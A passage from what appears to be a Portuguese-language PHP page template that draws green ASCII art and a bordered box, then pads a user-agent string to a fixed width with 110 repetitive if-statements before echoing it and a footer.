|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">::</font>                       <font style="color: #006400;">      '8P" d8P' 8 -  d88P' </font>                 <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">::</font>                      <font style="color: #006400;">      d,' ,d8'  ''  dd88'   </font>                 <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">::</font>                     <font style="color: #006400;">      d'   8P'  d' dd88'8   </font>                  <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>                    <font style="color: #006400;">      ,:   `'   d:ddO8P' `b.  </font>                 <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>                 <font style="color: #006400;"> ,dooood88: ,    ,d8888""    ```b.   </font>             <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>               <font style="color: #006400;">.o8"'""""""Y8.b    8 `"''    .o'  `"""ob.  </font>         <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>            <font style="color: #006400;">  dP'         `8:     K       dP''        "`Yo. </font>       <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>           <font style="color: #006400;">  dP            88     8b.   ,d'              ``b  </font>     <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>          <font style="color: #006400;">   8.            8P     8""'  `"                 :.  </font>    <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">:</font>         <font style="color: #006400;">           88888.                         `888,     Y </font>    <font style="color: #00FF00;">8:</font>                      <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">``ob...............--"""""'----------------------`""""""""'"""`'"""""</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                                                                                                                           <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>  <font style="color: #00FF00;">UserAgent</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($UserAgentKilla);

if ($len == 110) { $buf = "". $UserAgentKilla .""; }
if ($len == 109) { $buf = "". $UserAgentKilla ." "; }
if ($len == 108) { $buf = "". $UserAgentKilla ."  "; }
if ($len == 107) { $buf = "". $UserAgentKilla ."   "; }
if ($len == 106) { $buf = "". $UserAgentKilla ."    "; }
if ($len == 105) { $buf = "". $UserAgentKilla ."     "; }
if ($len == 104) { $buf = "". $UserAgentKilla ."      "; }
if ($len == 103) { $buf = "". $UserAgentKilla ."       "; }
if ($len == 102) { $buf = "". $UserAgentKilla ."        "; }
if ($len == 101) { $buf = "". $UserAgentKilla ."         "; }
if ($len == 100) { $buf = "". $UserAgentKilla ."          "; }
if ($len == 99) { $buf = "". $UserAgentKilla ."           "; }
if ($len == 98) { $buf = "". $UserAgentKilla ."            "; }
if ($len == 97) { $buf = "". $UserAgentKilla ."             "; }
if ($len == 96) { $buf = "". $UserAgentKilla ."              "; }
if ($len == 95) { $buf = "". $UserAgentKilla ."               "; }
if ($len == 94) { $buf = "". $UserAgentKilla ."                "; }
if ($len == 93) { $buf = "". $UserAgentKilla ."                 "; }
if ($len == 92) { $buf = "". $UserAgentKilla ."                  "; }
if ($len == 91) { $buf = "". $UserAgentKilla ."                   "; }
if ($len == 90) { $buf = "". $UserAgentKilla ."                    "; }
if ($len == 89) { $buf = "". $UserAgentKilla ."                     "; }
if ($len == 88) { $buf = "". $UserAgentKilla ."                      "; }
if ($len == 87) { $buf = "". $UserAgentKilla ."                       "; }
if ($len == 86) { $buf = "". $UserAgentKilla ."                        "; }
if ($len == 85) { $buf = "". $UserAgentKilla ."                         "; }
if ($len == 84) { $buf = "". $UserAgentKilla ."                          "; }
if ($len == 83) { $buf = "". $UserAgentKilla ."                           "; }
if ($len == 82) { $buf = "". $UserAgentKilla ."                            "; }
if ($len == 81) { $buf = "". $UserAgentKilla ."                             "; }
if ($len == 80) { $buf = "". $UserAgentKilla ."                              "; }
if ($len == 79) { $buf = "". $UserAgentKilla ."                               "; }
if ($len == 78) { $buf = "". $UserAgentKilla ."                                "; }
if ($len == 77) { $buf = "". $UserAgentKilla ."                                 "; }
if ($len == 76) { $buf = "". $UserAgentKilla ."                                  "; }
if ($len == 75) { $buf = "". $UserAgentKilla ."                                   "; }
if ($len == 74) { $buf = "". $UserAgentKilla ."                                    "; }
if ($len == 73) { $buf = "". $UserAgentKilla ."                                     "; }
if ($len == 72) { $buf = "". $UserAgentKilla ."                                      "; }
if ($len == 71) { $buf = "". $UserAgentKilla ."                                       "; }
if ($len == 70) { $buf = "". $UserAgentKilla ."                                        "; }
if ($len == 69) { $buf = "". $UserAgentKilla ."                                         "; }
if ($len == 68) { $buf = "". $UserAgentKilla ."                                          "; }
if ($len == 67) { $buf = "". $UserAgentKilla ."                                           "; }
if ($len == 66) { $buf = "". $UserAgentKilla ."                                            "; }
if ($len == 65) { $buf = "". $UserAgentKilla ."                                             "; }
if ($len == 64) { $buf = "". $UserAgentKilla ."                                              "; }
if ($len == 63) { $buf = "". $UserAgentKilla ."                                               "; }
if ($len == 62) { $buf = "". $UserAgentKilla ."                                                "; }
if ($len == 61) { $buf = "". $UserAgentKilla ."                                                 "; }
if ($len == 60) { $buf = "". $UserAgentKilla ."                                                  "; }
if ($len == 59) { $buf = "". $UserAgentKilla ."                                                   "; }
if ($len == 58) { $buf = "". $UserAgentKilla ."                                                    "; }
if ($len == 57) { $buf = "". $UserAgentKilla ."                                                     "; }
if ($len == 56) { $buf = "". $UserAgentKilla ."                                                      "; }
if ($len == 55) { $buf = "". $UserAgentKilla ."                                                       "; }
if ($len == 54) { $buf = "". $UserAgentKilla ."                                                        "; }
if ($len == 53) { $buf = "". $UserAgentKilla ."                                                         "; }
if ($len == 52) { $buf = "". $UserAgentKilla ."                                                          "; }
if ($len == 51) { $buf = "". $UserAgentKilla ."                                                           "; }
if ($len == 50) { $buf = "". $UserAgentKilla ."                                                            "; }
if ($len == 49) { $buf = "". $UserAgentKilla ."                                                             "; }
if ($len == 48) { $buf = "". $UserAgentKilla ."                                                              "; }
if ($len == 47) { $buf = "". $UserAgentKilla ."                                                               "; }
if ($len == 46) { $buf = "". $UserAgentKilla ."                                                                "; }
if ($len == 45) { $buf = "". $UserAgentKilla ."                                                                 "; }
if ($len == 44) { $buf = "". $UserAgentKilla ."                                                                  "; }
if ($len == 43) { $buf = "". $UserAgentKilla ."                                                                   "; }
if ($len == 42) { $buf = "". $UserAgentKilla ."                                                                    "; }
if ($len == 41) { $buf = "". $UserAgentKilla ."                                                                     "; }
if ($len == 40) { $buf = "". $UserAgentKilla ."                                                                      "; }
if ($len == 39) { $buf = "". $UserAgentKilla ."                                                                       "; }
if ($len == 38) { $buf = "". $UserAgentKilla ."                                                                        "; }
if ($len == 37) { $buf = "". $UserAgentKilla ."                                                                         "; }
if ($len == 36) { $buf = "". $UserAgentKilla ."                                                                          "; }
if ($len == 35) { $buf = "". $UserAgentKilla ."                                                                           "; }
if ($len == 34) { $buf = "". $UserAgentKilla ."                                                                            "; }
if ($len == 33) { $buf = "". $UserAgentKilla ."                                                                             "; }
if ($len == 32) { $buf = "". $UserAgentKilla ."                                                                              "; }
if ($len == 31) { $buf = "". $UserAgentKilla ."                                                                               "; }
if ($len == 30) { $buf = "". $UserAgentKilla ."                                                                                "; }
if ($len == 29) { $buf = "". $UserAgentKilla ."                                                                                 "; }
if ($len == 28) { $buf = "". $UserAgentKilla ."                                                                                  "; }
if ($len == 27) { $buf = "". $UserAgentKilla ."                                                                                   "; }
if ($len == 26) { $buf = "". $UserAgentKilla ."                                                                                    "; }
if ($len == 25) { $buf = "". $UserAgentKilla ."                                                                                     "; }
if ($len == 24) { $buf = "". $UserAgentKilla ."                                                                                      "; }
if ($len == 23) { $buf = "". $UserAgentKilla ."                                                                                       "; }
if ($len == 22) { $buf = "". $UserAgentKilla ."                                                                                        "; }
if ($len == 21) { $buf = "". $UserAgentKilla ."                                                                                         "; }
if ($len == 20) { $buf = "". $UserAgentKilla ."                                                                                          "; }
if ($len == 19) { $buf = "". $UserAgentKilla ."                                                                                           "; }
if ($len == 18) { $buf = "". $UserAgentKilla ."                                                                                            "; }
if ($len == 17) { $buf = "". $UserAgentKilla ."                                                                                             "; }
if ($len == 16) { $buf = "". $UserAgentKilla ."                                                                                              "; }
if ($len == 15) { $buf = "". $UserAgentKilla ."                                                                                               "; }
if ($len == 14) { $buf = "". $UserAgentKilla ."                                                                                                "; }
if ($len == 13) { $buf = "". $UserAgentKilla ."                                                                                                 "; }
if ($len == 12) { $buf = "". $UserAgentKilla ."                                                                                                  "; }
if ($len == 11) { $buf = "". $UserAgentKilla ."                                                                                                   "; }
if ($len == 10) { $buf = "". $UserAgentKilla ."                                                                                                    "; }
if ($len ==  9) { $buf = "". $UserAgentKilla ."                                                                                                     "; }
if ($len ==  8) { $buf = "". $UserAgentKilla ."                                                                                                      "; }
if ($len ==  7) { $buf = "". $UserAgentKilla ."                                                                                                       "; }
if ($len ==  6) { $buf = "". $UserAgentKilla ."                                                                                                        "; }
if ($len ==  5) { $buf = "". $UserAgentKilla ."                                                                                                         "; }
if ($len ==  4) { $buf = "". $UserAgentKilla ."                                                                                                          "; }
if ($len ==  3) { $buf = "". $UserAgentKilla ."                                                                                                           "; }
if ($len ==  2) { $buf = "". $UserAgentKilla ."                                                                                                            "; }
if ($len ==  1) { $buf = "". $UserAgentKilla ."                                                                                                             "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">+---------------------------------------------------------------------------------------------------------------------------+</font>  |
|                                                                                                                                 |
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre>

</center></form></body></html>

<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
